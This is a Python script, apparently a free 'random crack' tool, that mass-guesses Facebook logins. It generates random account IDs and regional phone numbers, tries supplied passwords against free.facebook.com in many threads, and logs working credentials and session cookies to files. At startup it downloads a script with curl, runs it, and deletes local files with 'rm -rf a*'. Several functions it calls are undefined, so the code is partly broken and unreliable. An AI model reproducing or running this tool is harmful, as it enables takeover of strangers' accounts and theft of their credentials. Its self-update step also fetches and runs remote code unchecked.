#coding=utf
#DECODE BY HASAAN MIRZA
import os,sys,time,json,random,re,string,platform,base64
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python ali.py')
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
logo =  """   
    
          
.##.....##....###.....######..##.....##
.##.....##...##.##...##....##.##.....##
.##.....##..##...##..##.......##.....##
.#########.##.....##..######..##.....##
.##.....##.#########.......##.##.....##
.##.....##.##.....##.##....##.##.....##
.##.....##.##.....##..######...#######.


══════════════════════════════════════════════════
  Author       : Hasaan Mirza
  Github       : Hasaan-Mirza
  TOOLS STATUS : Free
  Facebook     : Thiie'w HaSu
══════════════════════════════════════════════════"""
loop = 0
oks = []
cps = []
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    proxy = requests.get('https://raw.githubusercontent.com/ALI-JUTT/Ahmed/main/update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/ALI-JUTT/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://raw.githubusercontent.com/ALI-JUTT/ali/main/ali.py > ali.py')
        os.system('python ali.py')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

def HASU():
    os.system('clear')
    print(logo)
    print('[1] Random crack')
    print(50*'-')
    opt = input('Choose option >>> ')
    if opt =='1':
        random_crack()
    else:
        print('\n\033[1;31mChoose valid option\033[0;97m')
def random_crack():
    os.system('clear')
    print(logo)
    print('[1] Random UID crack')
    print('[2] Random number crack')
    print('[B] Back')
    print(50*'-')
    opt = input('Choose option >>> ')
    if opt =='1':
        random_uid()
    elif opt =='2':
        random_number()
    elif opt =='3':
        main()
    else:
        print('\n\033[1;31mChoose valid option\033[0;97m')
def random_uid():
    user=[]
    os.system('clear')
    print(logo)
    limit = int(input('How many ids do you want to add ? '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(11))
        user.append('10000'+nmp)
    print('\n\033[1;33mExample: 123456,1234567,12345678 ... \033[0;97m')
    pwx = input('Put passwords: ').split(',')
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('Total ids: '+tl)
        print('The process has been started')
        print(50*'-')
        for uid in user:
            yaari.submit(rcrack,uid,pwx,tl)
    print(50*'-')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print(50*'-')
def random_number():
    user=[]
    os.system('clear')
    print(logo)
    
    
    jalan("\033[1;37m\t  USE OUR COUNTRY CODE  ")
    jalan('\033[1;36m     \t     PAK CODES\n     \033[1;33m92301, \033[1;33m92302 ,\033[1;33m92303 ,\033[1;33m92305  ...\033[0;97m')
    jalan('\033[1;32m============================================')
    jalan('\033[1;36m     \t     INDIA CODES\n     \033[1;33m91778, \033[1;33m91930 ,\033[1;33m91902 ,\033[1;33m91712  ...\033[0;97m')
    jalan('\033[1;32m============================================')
    jalan('\033[1;36m     \t     BD CODES\n     \033[1;33m88016, \033[1;33m88017 ,\033[1;33m88018 ,\033[1;33m88019  ...\033[0;97m')
    jalan('\033[1;32m============================================\n')
    code = input(' PUT CODE : ')
    print("")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = int(input("[*] Enter Password Limit : "))
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input("[*] Enter Password : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print('\033[1;36m TOTAL IDS: '+tl)
        print('\033[1;36m THE PROCESS HAS BEEN STARTED')
        print('\033[1;31m USE AEROPLANE MOOD IN EVERY 5 MIN ')
        print('\033[1;32m============================================')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
            manshera.submit(rcrack,uid,pwx,tl)
    print('\033[1;32m============================================')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print('\033[1;32m============================================')
 
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'free.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://t.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?0',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('    \033[1;32m(MHM-OK)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/MHM-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(MHM-CP)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/MHM-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[MHM] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
 
HASU()
 